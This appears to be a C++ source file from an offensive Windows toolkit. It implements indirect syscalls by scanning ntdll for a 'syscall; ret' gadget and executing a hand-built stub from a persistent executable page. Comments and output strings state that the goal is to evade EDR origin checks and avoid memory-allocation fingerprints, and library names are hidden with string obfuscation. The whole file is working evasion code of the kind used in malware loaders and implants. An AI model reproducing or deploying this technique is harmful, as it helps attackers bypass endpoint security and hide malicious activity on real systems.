#include "IndirectSyscall.h"
#include "DirectSyscall.h"
#include "Obf.h"

static PVOID g_gadget          = nullptr;
static void* g_indirectStubPage = nullptr;

// ── Find "syscall; ret" (0F 05 C3) inside ntdll .text ────────────────────────

PVOID IndirectSyscall::FindGadget() {
    if (g_gadget) return g_gadget;

    HMODULE hNtdll = GetModuleHandleA(S("ntdll.dll").c_str());
    if (!hNtdll) return NULL;

    BYTE* base = (BYTE*)hNtdll;
    auto* dos  = (PIMAGE_DOS_HEADER)base;
    auto* nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto* sec  = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE* start = base + sec->VirtualAddress;
        DWORD  size = sec->Misc.VirtualSize;
        for (DWORD j = 0; j + 2 < size; j++) {
            if (start[j]==0x0F && start[j+1]==0x05 && start[j+2]==0xC3) {
                g_gadget = start + j;
                return g_gadget;
            }
        }
    }
    return NULL;
}

// ── Indirect syscall execution via ntdll gadget ───────────────────────────────
// Stub layout:
//   4C 8B D1           mov r10, rcx          ; arg1 → r10 (syscall ABI)
//   B8 xx xx 00 00     mov eax, ssn
//   48 B9 xx..xx       mov rcx, <gadget>      ; target = ntdll "syscall;ret"
//   FF E1              jmp rcx
//
// Persistent page allocated once at first call — eliminates the repeated
// unbacked-RWX alloc/free fingerprint that the old per-call design produced.

typedef NTSTATUS(*IndirectFn)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                               ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);

NTSTATUS IndirectSyscall::Exec(int ssn,
    ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3, ULONG_PTR a4,
    ULONG_PTR a5, ULONG_PTR a6, ULONG_PTR a7, ULONG_PTR a8)
{
    if (ssn < 0) return STATUS_INVALID_PARAMETER;
    PVOID gadget = FindGadget();
    if (!gadget) return STATUS_NOT_FOUND;

    if (!g_indirectStubPage) {
        g_indirectStubPage = VirtualAlloc(NULL, 64,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);
        if (!g_indirectStubPage) return STATUS_NO_MEMORY;
    }

    BYTE stub[22] = {
        0x4C, 0x8B, 0xD1,
        0xB8, (BYTE)(ssn&0xFF),(BYTE)((ssn>>8)&0xFF), 0x00, 0x00,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0xFF, 0xE1
    };
    DWORD64 gAddr = (DWORD64)gadget;
    memcpy(stub + 10, &gAddr, 8);

    void* mem = g_indirectStubPage;
    memcpy(mem, stub, sizeof(stub));
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));

    auto fn = (IndirectFn)mem;
    return fn(a1,a2,a3,a4,a5,a6,a7,a8);
}

std::string IndirectSyscall::GadgetInfo() {
    PVOID g = FindGadget();
    if (!g) return "IndirectSyscall: no syscall;ret gadget found in ntdll .text";
    HMODULE hNtdll = GetModuleHandleA(S("ntdll.dll").c_str());
    char buf[256];
    snprintf(buf, sizeof(buf),
        "IndirectSyscall gadget: ntdll+0x%llX @ 0x%llX\n"
        "Bytes: 0F 05 C3 (syscall; ret)\n"
        "All syscalls via IndirectSyscall::Exec() originate from inside ntdll.\n"
        "EDR origin-check sees ntdll address — passes as legitimate.",
        (DWORD64)g - (DWORD64)hNtdll,
        (DWORD64)g);
    return std::string(buf);
}
